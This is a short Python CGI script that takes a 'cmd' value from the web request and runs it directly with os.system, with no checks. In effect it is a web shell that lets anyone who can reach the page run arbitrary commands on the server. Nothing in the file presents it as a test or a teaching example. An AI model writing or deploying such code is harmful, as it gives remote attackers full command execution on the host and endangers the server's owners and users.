import os
import cgi, cgitb, os
import time;
import sys
# Create instance of FieldStorage 
form = cgi.FieldStorage() 


# print ("Content-type:text/html\r\n\r\n")

cmd =  form.getvalue('cmd')
# cmd ="ls"
print("Error " + cmd , sys.stderr )

os.system(cmd)